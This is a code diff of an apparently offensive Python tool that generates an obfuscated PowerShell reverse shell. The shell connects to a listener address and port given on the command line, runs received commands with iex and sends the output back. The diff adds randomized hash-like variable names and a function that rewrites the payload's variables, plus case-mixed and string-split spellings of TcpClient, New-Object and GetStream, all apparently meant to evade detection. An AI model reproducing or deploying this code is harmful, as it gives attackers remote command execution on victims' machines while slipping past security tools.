@@ -96,7 +96,7 @@ WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"
 
 # N//e//w//O//b//j//e//c//t
 WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
-                   "New-ObJeCt", "NeW-oBJeCT", "&('New'+'-ObJect')", "&('{0}{1}'-f 'New-', 'Object')",
+                   "New-ObJeCt", "NeW-oBJeCT", "&('New'+'-ObJect')", "&('N'+'e'+'w'+'-ObJect')",
                    ]
 
 # S//y//s//t//e//m//.//N//e//t//.//S//o//c//k//e//t//s
@@ -106,7 +106,7 @@ WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''
                    ]
 
 # G//e//t//S//t//r//e//a//m
-WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S','T'+'r'+'e'+'am')",
+WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S'+'T'+'r'+'e'+'am')",
                    "('gEt'+'s'+'T'+'r'+'E'+'aM')", "('G'+'e'+'tStream')"
                    ]
 
@@ -114,6 +114,13 @@ WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'
 WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding"
                    ]
 
+WordCharSystem7 = ["$41b394758330c83757856aa482c79977", "$37f91a10810c37a0f946c88eecf0bb86",
+                   "$bc95dfc14146aa23e43f2ea7af04d310", "$e7fcf8e49e39af3c66af246fdcf535df"
+                   ]
+
+WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2",
+                   "$b91ae5f2a05e87e53ef4ca58305c600f", "$fb3c97733989bd69eede22507aab10df"
+                   ]
 # --------------------- Join List Together --------------------- #
 
 C1 = ''.join(Command1).strip()
@@ -176,14 +183,29 @@ def Execute_privilege():
 
 def Execute_Payload():
     with open('Payload.ps1', 'w') as run2:
-        run2.write(f"$ClIeNt = {repl3} {repl4}('{args.l}',{args.p});\n")
-        run2.write(f"$StReAm = $CLIent.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
+        run2.write(f"$client = {repl3} {repl4}('{args.l}',{args.p});\n")
+        run2.write(f"$StReAm = $client.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
         run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $byteS.LeNgTh)) -ne 0)" + "{;\n")
         run2.write(f"$data = (New-Object -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
-        run2.write('''$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $sendback2 = ${s`endbac`k} + 'JokerShell ' + (pwd).Path + '> ';\n''')
-        run2.write("$sendbyte = ([text.encoding]::ASCII).GetBYTeS($sendback2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$s.Flush()};$client.Close()\n")
-        run2.close()
+        run2.write('''$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $blabla2 = ${sendback} + 'JokerShell ' + (pwd).Path + '> ';\n''')
+        run2.write("$sendbyte = ([text.encoding]::ASCII).GetBYTeS($blabla2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$sTREaM.Flush()};$client.Close()\n")
+    run2.close()
+    time.sleep(1)
 
+def Change_Payload(x):
+    # Make Random MD5 Value Variables
+    repl7 = random.choice(WordCharSystem7)
+    repl8 = random.choice(WordCharSystem8)
+    # Change After .ps1 File Has Been Made
+    with open(x, "r") as run3:
+        file_content = run3.read()
+    new_content = file_content.replace("$client", repl7)
+    new_content2 = new_content.replace("$sendback", repl8)
+    new_content3 = new_content2.replace("sendback", repl8.split("$")[1])
+
+    with open(x, 'w') as run4:
+        run4.write(new_content3)
+    run3.close()
 
 # -------------------------------- ENCODE TO BASE64 WHEN FINISH ------------------------------#
  #                                                                                             #
@@ -198,6 +220,7 @@ def B64(FTD):
 def main():
     Execute_privilege()
     Execute_Payload()
+    Change_Payload("Payload.ps1")
     JOKER()
     Bomb()
     FP = 'Payload.ps1'
